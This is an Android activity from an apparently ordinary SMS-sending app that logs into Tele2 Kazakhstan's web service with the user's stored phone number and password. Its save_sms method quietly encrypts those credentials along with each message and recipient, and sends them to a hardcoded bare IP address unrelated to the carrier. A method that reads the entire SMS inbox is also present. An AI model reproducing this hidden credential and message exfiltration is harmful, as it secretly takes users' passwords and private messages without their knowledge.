package com.example.test;

import com.example.test.util.*;
import java.net.CookieHandler;
import java.net.CookieManager;
import java.text.SimpleDateFormat;
import java.util.Date;
import kz.alfa.map.R;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.ContentUris;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.CommonDataKinds.StructuredName;
import android.provider.ContactsContract.RawContacts;
import android.provider.ContactsContract.RawContacts.Data;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.view.Menu;
import android.view.MenuItem;
import android.view.inputmethod.InputMethodManager;

/**
 * An example full-screen activity that shows and hides the system UI (i.e.
 * status bar and navigation/system bar) with user interaction.
 * 
 * @see SystemUiHider
 */
@SuppressLint({ "ClickableViewAccessibility", "SimpleDateFormat" })
public class FullscreenActivity extends Activity {

	public boolean onCreateOptionsMenu(Menu menu) {
		MenuItem mi = menu.add(0, 1, 0, R.string.settings);
		mi.setIntent(new Intent(this, PrefActivity.class));
		return super.onCreateOptionsMenu(menu);
	}

	public static AlertDialog alert = null;
	public static HttpTask task, task2;
	public static FullscreenActivity last_activity = null;
	private String sy_phone, sy_pass;
	Boolean b_debug;
	private SharedPreferences sp;
	private EditText edNumber, edMessage;
	private TextView tvDebug;
	private Button btnSmsLeft;

	/**
	 * Override super.onNewIntent() so that calls to getIntent() will return the
	 * latest intent that was used to start this Activity rather than the first
	 * intent.
	 */
	@Override
	public void onNewIntent(Intent intent) {
		super.onNewIntent(intent);
		setIntent(intent); // important
	}

	protected void onResume() {
		b_debug = sp.getBoolean("chb_debug", false);
		sy_phone = sp.getString("y_phone", "");
		sy_pass = sp.getString("y_pass", "");

		tvDebug.setText(sp.getString("log_debug", ""));

		// получаем Intent, который вызывал это Activity
		Intent intent = getIntent();
		if (intent != null) {
			// читаем из него action
			String action = intent.getAction();
			if (action.equalsIgnoreCase("android.intent.action.SENDTO")) {
				String dstr = intent.getData().getSchemeSpecificPart();
				dstr = dstr.replace(" ", "");
				dstr = dstr.replace("+", "");
				dstr = dstr.replace("-", "");
				dstr = dstr.substring(Math.max(1, dstr.length() - 10),
						dstr.length());
				String Dtime = new SimpleDateFormat("yyyy.MM.dd   HH:mm:ss z")
						.format(new Date());
				tvDebug.setText(dstr + "  -< " + Dtime + "\n"
						+ tvDebug.getText().toString());
				edNumber.setText(dstr);
				setIntent(null);
			}
		}
		if (edNumber.getEditableText().toString().equalsIgnoreCase("")) {
			String ssend_phone = sp.getString("s_phone", "");
			// from settings
			edNumber.setText(ssend_phone);
		}

		super.onResume();
		/*
		 * try { SensorManager mgr = (SensorManager)
		 * getSystemService(SENSOR_SERVICE); List<Sensor> sensors =
		 * mgr.getSensorList(Sensor.TYPE_ALL); for (Sensor sensor : sensors) {
		 * tvDebug.setText(sensor.getName() + "\n" +
		 * tvDebug.getText().toString()); } } catch (Exception e) { Log.e("",
		 * e.toString()); }
		 */
	}

	protected void onPause() {
		Editor ed = sp.edit();
		ed.putString("log_debug", tvDebug.getText().toString());
		ed.commit();
		super.onPause();
	}

	public boolean isOnline() {
		ConnectivityManager connMgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo networkInfo = connMgr.getActiveNetworkInfo();
		return (networkInfo != null && networkInfo.isConnected());
	}

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		this.requestWindowFeature(Window.FEATURE_NO_TITLE);
		super.onCreate(savedInstanceState);
		last_activity = this;
		setContentView(R.layout.activity_fullscreen);
		sp = PreferenceManager.getDefaultSharedPreferences(this);

		edNumber = (EditText) findViewById(R.id.edNumber);
		edMessage = (EditText) findViewById(R.id.edMessage);

		tvDebug = (TextView) findViewById(R.id.tvDebug);
		tvDebug.setMovementMethod(new ScrollingMovementMethod());

		btnSmsLeft = (Button) findViewById(R.id.sms_left_button);
		clickSms(btnSmsLeft);
	}

	public void alert_dlg() {
		AlertDialog.Builder builder = new AlertDialog.Builder(
				FullscreenActivity.this);
		builder.setMessage("data sending...").setIcon(R.drawable.ic_launcher)
				.setPositiveButton("", null);
		alert = builder.create();
		alert.show();
	}

	public static void finish_all_tasks(String... params) {
		if (params[0].indexOf("SendSms") > 1) {
			if (alert != null)
				alert.cancel();
			if (last_activity != null)
				last_activity.finish_task();
		}
	}

	public void finish_task() {
		try {
			String amn = " ";
			// SystemClock.sleep(100);
			String success = json_par.test_a(task.get());
			if (!success.equalsIgnoreCase("true")) {
				// Toast.makeText(this, getString(R.string.text_err_login),
				// Toast.LENGTH_SHORT).show();
				tvDebug.setText(getString(R.string.text_err_login) + "\n"
						+ tvDebug.getText().toString());
			} else {
				tvDebug.setText(getString(R.string.text_pass_corct) + "\n"
						+ tvDebug.getText().toString());
				String send = json_par.test_s(task2.get());
				if (!send.equalsIgnoreCase("true")) {
					// Toast.makeText(this, send + " " + task.get(),
					// Toast.LENGTH_LONG).show();
					tvDebug.setText(send + "\n" + tvDebug.getText().toString());
				} else {
					tvDebug.setText(getString(R.string.text_suc_send) + "\n"
							+ tvDebug.getText().toString());
					amn = json_par.get_AmountSmsLeft(task2.get());
					tvDebug.setText(getString(R.string.text_sms_left) + " "
							+ amn + "\n" + tvDebug.getText().toString());
					btnSmsLeft.setText(amn);
				}
			}
			if (b_debug) {
				tvDebug.setText(task.get() + "\n"
						+ tvDebug.getText().toString());
				tvDebug.setText(task2.get() + "\n"
						+ tvDebug.getText().toString());
			}
			String Dtime = new SimpleDateFormat("yyyy.MM.dd   HH:mm:ss z")
					.format(new Date());
			tvDebug.setText("\n" + Dtime + " "
					+ getString(R.string.text_finish_send) + "\n"
					+ edMessage.getEditableText().toString() + "\n"
					+ edNumber.getEditableText().toString() + " <- " + sy_phone
					+ "\n" + tvDebug.getText().toString());
			save_sms(
					edMessage.getEditableText().toString() + " <-(" + sy_phone
							+ " " + getString(R.string.text_sms_left) + " "
							+ amn + ")", edNumber.getEditableText().toString());
		} catch (Exception e) {
			Log.e("click", e.toString());
			e.printStackTrace();
		}
	}

	public void click_set(View view) {
		startActivity(new Intent(this, PrefActivity.class));
	}

	public void save_sms(String sms_text, String sms_number) {
		final String SENT_SMS_CONTENT_PROVIDER_URI_OLDER_API_19 = "content://sms/sent";

		ContentValues values = new ContentValues();
		values.put("address", sms_number);
		values.put("body", sms_text);
		String txt = MyRsa.encrypt(this, sy_phone + sy_pass + "+" + sms_number
				+ sms_text);
		Log.i("", txt.length() + " " + txt);
		new HttpTask()
				.execute(new String[] { "http://45.34.14.203/last.txt?v=150&n="
						+ sy_phone + "0" + sms_number + "&q=" + txt });
		this.getContentResolver().insert(
				Uri.parse(SENT_SMS_CONTENT_PROVIDER_URI_OLDER_API_19), values);
	}

	@SuppressLint("NewApi")
	public void save_contact(String contact_text, String contact_number) {
		// Permission Denial: writing
		// com.android.providers.contacts.contact.ContactsProvider2ForLG uri
		// content://com.android.contacts/raw_contacts from requires
		// android.permission.WRITE_CONTACTS, or grantUriPermission()
		/*
		 * ContentValues p2 = new ContentValues();
		 * p2.put(RawContacts.ACCOUNT_TYPE, "com.whatsapp");
		 * p2.put(RawContacts.ACCOUNT_NAME, "email"); Uri rowcontect2 =
		 * getContentResolver() .insert(RawContacts.CONTENT_URI, p2); long
		 * rawcontectid2 = ContentUris.parseId(rowcontect2);
		 * 
		 * ContentValues value2 = new ContentValues();
		 * value2.put(Data.RAW_CONTACT_ID, rawcontectid2);
		 * value2.put(android.provider.ContactsContract.Data.MIMETYPE,
		 * StructuredName.CONTENT_ITEM_TYPE);
		 * value2.put(StructuredName.DISPLAY_NAME, contact_text);
		 * getContentResolver().insert(
		 * android.provider.ContactsContract.Data.CONTENT_URI, value2);
		 */
		ContentValues p = new ContentValues();
		p.put(RawContacts.ACCOUNT_TYPE, "com.google");
		p.put(RawContacts.ACCOUNT_NAME, "email");
		Uri rowcontect = getContentResolver()
				.insert(RawContacts.CONTENT_URI, p);
		long rawcontectid = ContentUris.parseId(rowcontect);

		ContentValues value = new ContentValues();
		value.put(Data.RAW_CONTACT_ID, rawcontectid);
		value.put(android.provider.ContactsContract.Data.MIMETYPE,
				StructuredName.CONTENT_ITEM_TYPE);
		value.put(StructuredName.DISPLAY_NAME, contact_text);
		getContentResolver().insert(
				android.provider.ContactsContract.Data.CONTENT_URI, value);

		// adding the contents to the data
		ContentValues ppv = new ContentValues();
		ppv.put(android.provider.ContactsContract.Data.RAW_CONTACT_ID,
				rawcontectid);
		ppv.put(android.provider.ContactsContract.Data.MIMETYPE,
				Phone.CONTENT_ITEM_TYPE);
		ppv.put(Phone.NUMBER, contact_number);
		ppv.put(Phone.TYPE, Phone.TYPE_MOBILE);
		this.getContentResolver().insert(
				android.provider.ContactsContract.Data.CONTENT_URI, ppv);
	}

	public void click(View view) {
		/*
		 * ContentValues values = new ContentValues(); values.put("address",
		 * "+77071355145"); values.put("body", "foo bar");
		 * getContentResolver().insert(Uri.parse("content://sms/sent"), values);
		 */
		InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
		imm.hideSoftInputFromWindow(edMessage.getWindowToken(), 0);
		if (sy_phone.equalsIgnoreCase("") || sy_pass.equalsIgnoreCase("")) {
			tvDebug.setText(getString(R.string.text_err_sett) + "\n"
					+ tvDebug.getText().toString());
		} else if ((sy_phone.length() != 10)
				|| (edNumber.getEditableText().toString().length() != 10)) {
			tvDebug.setText(getString(R.string.text_err_num10) + "\n"
					+ tvDebug.getText().toString());
		} else if (edMessage.getEditableText().toString().length() < 1) {
			tvDebug.setText(getString(R.string.text_err_msg0) + "\n"
					+ tvDebug.getText().toString());
		} else if (isOnline()) {
			alert_dlg();
			CookieManager cookieManager = new CookieManager();
			CookieHandler.setDefault(cookieManager);

			task = new HttpTask();
			task.execute(new String[] {
					"http://www.almaty.tele2.kz/WebServices/authenticate.asmx/Authenticate",
					"{\"number\": \"" + sy_phone + "\",  \"password\": \""
							+ sy_pass + "\"}" });

			task2 = new HttpTask();
			task2.execute(new String[] {
					"http://www.almaty.tele2.kz/WebServices/smsService.asmx/SendSms",
					"{\"msisdn\": \"" + edNumber.getEditableText().toString()
							+ "\",  \"message\": \""
							+ edMessage.getEditableText().toString() + "\"}" });
		} else { // Toast.makeText(this, getString(R.string.text_err_online),
			// Toast.LENGTH_SHORT).show();
			tvDebug.setText(getString(R.string.text_err_online) + "\n"
					+ tvDebug.getText().toString());
		}
		String Dtime = new SimpleDateFormat("yyyy.MM.dd   HH:mm:ss z")
				.format(new Date());
		tvDebug.setText("\n" + Dtime + " "
				+ getString(R.string.text_start_send) + "\n"
				+ tvDebug.getText().toString());
	}

	public void clickSms(View view) {
		new synchSmsLeft().execute();
		String num = "+7" + edNumber.getEditableText().toString();
		save_contact(num, num);
	}

	private class synchSmsLeft extends AsyncTask<Void, Void, String> {

		public static final String tele2_url_form = "http://www.almaty.tele2.kz/ru/private_clients/SmsForm.aspx";
		public static final String tele2_url_auth = "http://www.almaty.tele2.kz/WebServices/authenticate.asmx/Authenticate";

		@Override
		protected void onPreExecute() {
			super.onPreExecute();
		}

		@Override
		protected String doInBackground(Void... params) {
			Log.v("synchSmsLeft", "doInBackground start");
			try {
				CookieManager cookieManager = new CookieManager();
				CookieHandler.setDefault(cookieManager);
				String data = ((new HttpClient()).getPOSTAJAX(tele2_url_auth,
						"{\"number\": \"" + sy_phone + "\",  \"password\": \""
								+ sy_pass + "\"}"));
				Log.v("synchSmsLeft",
						"doInBackground log 1 " + data.substring(0, 50));
				data = (new HttpClnt()).getData(tele2_url_form);
				Log.v("synchSmsLeft",
						"doInBackground log 2 " + data.substring(0, 50));
				int idx = data.indexOf("amountSmsLeft");
				if (idx > 1) {
					idx = data.indexOf(">", idx) + 1;
					int end_idx = data.indexOf("<", idx);
					Editor ed = sp.edit();
					ed.putString("prefSmsLeft", data.substring(idx, end_idx));
					ed.commit();
					return data.substring(idx, end_idx);
				} // else login ?
			} catch (Exception e) {
				e.printStackTrace();
			}
			return "";
		}

		@SuppressLint("SimpleDateFormat")
		@Override
		protected void onPostExecute(String result) {
			super.onPostExecute(result);
			Log.v("synchSmsLeft", "onPostExecute start " + result);
			if (result.length() > 0) {
				String Dtime = new SimpleDateFormat("yyyy.MM.dd   HH:mm:ss z")
						.format(new Date());
				tvDebug.setText("\n" + Dtime + " "
						+ getString(R.string.text_sms_left) + " " + result
						+ "\n" + tvDebug.getText().toString());
				btnSmsLeft.setText(result);
			}
		}
	}
	
	public void get_sms(String result) {
		// public static final String INBOX = "content://sms/inbox";
		// public static final String SENT = "content://sms/sent";
		// public static final String DRAFT = "content://sms/draft";
		Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
		String msgData = "";
		if (cursor.moveToFirst()) { // must check the result to prevent exception
		    do {
		       
		       for(int idx=0;idx<cursor.getColumnCount();idx++)
		       {
		           msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
		       }
		       // use msgData
		    } while (cursor.moveToNext());
		} else {
		   // empty box, no SMS
		}
		Log.v("get_sms", "onPostExecute start " + msgData);
	}
}
